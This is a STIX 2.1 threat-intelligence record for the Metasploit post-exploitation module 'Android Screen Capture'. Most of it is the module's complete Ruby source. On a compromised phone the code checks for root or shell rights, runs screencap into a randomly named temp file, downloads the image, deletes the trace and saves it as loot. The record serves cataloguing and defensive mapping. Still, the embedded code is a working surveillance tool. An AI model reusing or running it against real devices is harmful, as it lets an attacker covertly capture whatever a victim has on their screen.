{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1f0cd07d-7d9c-4c88-8103-f49a288f8818",
    "created": "2024-08-14T16:33:04.623877Z",
    "modified": "2024-08-14T16:33:04.623881Z",
    "name": "Android Screen Capture",
    "description": " This module takes a screenshot of the target phone.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/android/capture/screen.rb",
            "external_id": "screen.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Common\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Android Screen Capture',\n        'Description' => %q{\n          This module takes a screenshot of the target phone.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'timwr' ],\n        'Platform' => [ 'android' ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ]\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TMP_PATH', [true, 'Path to remote temp directory', '/data/local/tmp/']),\n        OptString.new('EXE_PATH', [true, 'Path to remote screencap executable', '/system/bin/screencap'])\n      ]\n    )\n  end\n\n  def run\n    id = cmd_exec('id')\n    unless id =~ (/root/) || id =~ (/shell/)\n      print_error('This module requires shell or root permissions')\n      return\n    end\n\n    exe_path = datastore['EXE_PATH']\n    tmp_path = datastore['TMP_PATH']\n    if !file?(exe_path)\n      print_error('Aborting, screencap binary not found.')\n      return\n    end\n\n    begin\n      file = \"#{tmp_path}/#{Rex::Text.rand_text_alpha(7)}.png\"\n      cmd_exec(\"#{exe_path} -p #{file}\")\n      print_good('Downloading screenshot...')\n      data = read_file(file)\n      file_rm(file)\n    rescue ::Rex::Post::Meterpreter::RequestError => e\n      print_error('Error taking the screenshot')\n      vprint_error(\"#{e.class} #{e} #{e.backtrace}\")\n      return\n    end\n\n    unless data\n      print_error('No data for screenshot')\n      return\n    end\n\n    begin\n      fn = 'screenshot.png'\n      location = store_loot('screen_capture.screenshot', 'image/png', session, data, fn, 'Screenshot')\n      print_good(\"Screenshot saved at #{location}\")\n    rescue ::IOError, ::Errno::ENOENT => e\n      print_error('Error storing screenshot')\n      vprint_error(\"#{e.class} #{e} #{e.backtrace}\")\n      return\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'android' ]"
    ]
}